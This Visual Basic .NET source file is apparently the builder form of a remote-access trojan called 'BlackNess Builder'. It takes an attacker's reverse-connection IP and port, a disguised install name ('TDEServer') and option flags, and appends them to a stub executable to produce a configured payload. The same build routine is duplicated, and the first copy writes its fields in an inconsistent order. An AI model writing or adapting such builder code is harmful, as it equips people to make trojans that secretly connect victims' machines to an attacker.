Public Class builder
    Dim stub, text1, text2, text3, text4, text5, text6, text7, text8, text9, text10, text11, text12, text13, text14, text15, text16, text17, text18, text19, text20, text21, text22, text23 As String
    Const FileSplit = "@~mad-coder~@"

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        ipport.Show()

    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each lvItem As ListViewItem In Reverse.SelectedItems

            lvItem.Remove()

        Next
    End Sub

    Private Sub builder_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        TextBox1.Enabled = False
        TextBox2.Enabled = False


        TextBox18.Enabled = False
        TextBox17.Enabled = False
        CheckBox4.Enabled = False
        CheckBox5.Enabled = False
        CheckBox6.Enabled = False
        CheckBox7.Enabled = False
        RadioButton1.Checked = False
        RadioButton2.Checked = False
        RadioButton3.Checked = False
        RadioButton4.Checked = False
        RadioButton5.Checked = False

   
    End Sub

    Private Sub GroupBox3_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox1.Enabled = True
            TextBox2.Enabled = True
            RadioButton1.Checked = True
            RadioButton2.Checked = True
            RadioButton3.Checked = True
            RadioButton4.Checked = True
            RadioButton5.Checked = True
        End If
        If CheckBox1.Checked = False Then
            TextBox1.Enabled = False
            TextBox2.Enabled = False
            RadioButton1.Checked = False
            RadioButton2.Checked = False
            RadioButton3.Checked = False
            RadioButton4.Checked = False
            RadioButton5.Checked = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)




    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub



    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim spremi As New SaveFileDialog
        spremi.Title = "BlackNess Builder"
        spremi.Filter = "EXE Files (*.exe)|*.exe"
        spremi.ShowDialog()
        If spremi.FileName = "" Then

        Else

        End If

        text1 = Reverse.Items(0).Text
        text2 = Reverse.Items(0).SubItems(1).Text
        text4 = "0"
        text5 = "0"
        text6 = "0"
        text7 = "0"
        text8 = ""
        text9 = ""
        text10 = "0"
        text11 = "0"
        text12 = "0"
        text13 = "0"
        text14 = "0"
        text15 = "0"
        text16 = "TDEServer"
        text17 = "TDEServerEXE"
        text18 = "0"
        text19 = "0"
        text20 = "0"
        text21 = "0"
     
        If CheckBox11.Checked = True Then
            text21 = "1"
        End If
        If CheckBox9.Checked = True Then
            text3 = "1"
        End If
        If CheckBox3.Checked = True Then
            text20 = "1"
        End If
        If CheckBox2.Checked = True Then
            text19 = "1"
        End If
        If CheckBox8.Checked = True Then
            If CheckBox7.Checked = True Then
                text4 = "1"
            End If
            If CheckBox5.Checked = True Then
                text5 = "1"
            End If
            If CheckBox6.Checked = True Then
                text6 = "1"
            End If
            If CheckBox4.Checked = True Then
                text7 = "1"
            End If
            text8 = TextBox18.Text
            text9 = TextBox17.Text
        End If

        If CheckBox1.Checked = True Then
            text10 = "1"
            If RadioButton1.Checked = True Then
                text11 = "1"
            End If
            If RadioButton2.Checked = True Then
                text12 = "1"
            End If
            If RadioButton3.Checked = True Then
                text13 = "1"
            End If
            If RadioButton4.Checked = True Then
                text14 = "1"
            End If
            If RadioButton5.Checked = True Then
                text15 = "1"
            End If
            text16 = TextBox1.Text
            text17 = TextBox2.Text
        End If

        If CheckBox10.Checked = True Then
            text18 = "1"
        End If

        FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, spremi.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2 & FileSplit & text3 & FileSplit & text4 & FileSplit & text5 & FileSplit & text6 & FileSplit & text7 & FileSplit & text8 & FileSplit & text9 & FileSplit & text10 & FileSplit & text11 & FileSplit & text12 & FileSplit & text13 & FileSplit & text14 & FileSplit & text15 & FileSplit & text16 & FileSplit & text17 & FileSplit & text18 & FileSplit & text19 & FileSplit & text10 & FileSplit & text20 & FileSplit & text21 & FileSplit & text22 & FileSplit & text23 & FileSplit)
        FileClose(1)



    End Sub

    Private Sub GroupBox5_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked = True Then
            TextBox18.Enabled = True
            TextBox17.Enabled = True
            CheckBox4.Enabled = True
            CheckBox5.Enabled = True
            CheckBox6.Enabled = True
            CheckBox7.Enabled = True
        End If
        If CheckBox8.Checked = False Then
            TextBox18.Enabled = False
            TextBox17.Enabled = False
            CheckBox4.Enabled = False
            CheckBox5.Enabled = False
            CheckBox6.Enabled = False
            CheckBox7.Enabled = False
        End If
    End Sub

    Private Sub Reverse_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Reverse.SelectedIndexChanged

    End Sub

  

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim imagepath As String = Nothing
        Dim open As New OpenFileDialog
        open.Title = "Select ICON"
        open.Filter = "ICO Files (*.ico)|*.ico"
        open.ShowDialog()
        If open.FileName <> "" Then
            imagepath = open.FileName
        End If
    End Sub
    Dim imagepath As String = Nothing

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        MsgBox("Don't put .exe at the end.")
    End Sub

 
    Private Sub ButtonX1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX1.Click
        ipport.Show()
    End Sub

    Private Sub ButtonX2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX2.Click
        For Each lvItem As ListViewItem In Reverse.SelectedItems

            lvItem.Remove()

        Next
    End Sub

    Private Sub ButtonX4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX4.Click
        Me.Close()
    End Sub

    Private Sub ButtonX3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX3.Click
        Dim spremi As New SaveFileDialog
        spremi.Title = "BlackNess Builder"
        spremi.Filter = "EXE Files (*.exe)|*.exe"
        spremi.ShowDialog()
        If spremi.FileName = "" Then

        Else

        End If

        text1 = Reverse.Items(0).Text
        text2 = Reverse.Items(0).SubItems(1).Text
        text4 = "0"
        text5 = "0"
        text6 = "0"
        text7 = "0"
        text8 = ""
        text9 = ""
        text10 = "0"
        text11 = "0"
        text12 = "0"
        text13 = "0"
        text14 = "0"
        text15 = "0"
        text16 = "TDEServer"
        text17 = "TDEServerEXE"
        text18 = "0"
        text19 = "0"
        text20 = "0"
        text21 = "0"
   

        If CheckBox11.Checked = True Then
            text21 = "1"
        End If
        If CheckBox9.Checked = True Then
            text3 = "1"
        End If
        If CheckBox3.Checked = True Then
            text20 = "1"
        End If
        If CheckBox2.Checked = True Then
            text19 = "1"
        End If
     

        If CheckBox8.Checked = True Then
            If CheckBox7.Checked = True Then
                text4 = "1"
            End If
            If CheckBox5.Checked = True Then
                text5 = "1"
            End If
            If CheckBox6.Checked = True Then
                text6 = "1"
            End If
            If CheckBox4.Checked = True Then
                text7 = "1"
            End If
            text8 = TextBox18.Text
            text9 = TextBox17.Text
        End If

        If CheckBox1.Checked = True Then
            text10 = "1"
            If RadioButton1.Checked = True Then
                text11 = "1"
            End If
            If RadioButton2.Checked = True Then
                text12 = "1"
            End If
            If RadioButton3.Checked = True Then
                text13 = "1"
            End If
            If RadioButton4.Checked = True Then
                text14 = "1"
            End If
            If RadioButton5.Checked = True Then
                text15 = "1"
            End If
            text16 = TextBox1.Text
            text17 = TextBox2.Text
        End If

        If CheckBox10.Checked = True Then
            text18 = "1"
        End If

        FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, spremi.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2 & FileSplit & text3 & FileSplit & text4 & FileSplit & text5 & FileSplit & text6 & FileSplit & text7 & FileSplit & text8 & FileSplit & text9 & FileSplit & text10 & FileSplit & text11 & FileSplit & text12 & FileSplit & text13 & FileSplit & text14 & FileSplit & text15 & FileSplit & text16 & FileSplit & text17 & FileSplit & text18 & FileSplit & text19 & FileSplit & text20 & FileSplit & text21 & FileSplit & text22 & FileSplit & text23 & FileSplit)
        FileClose(1)

    End Sub

End Class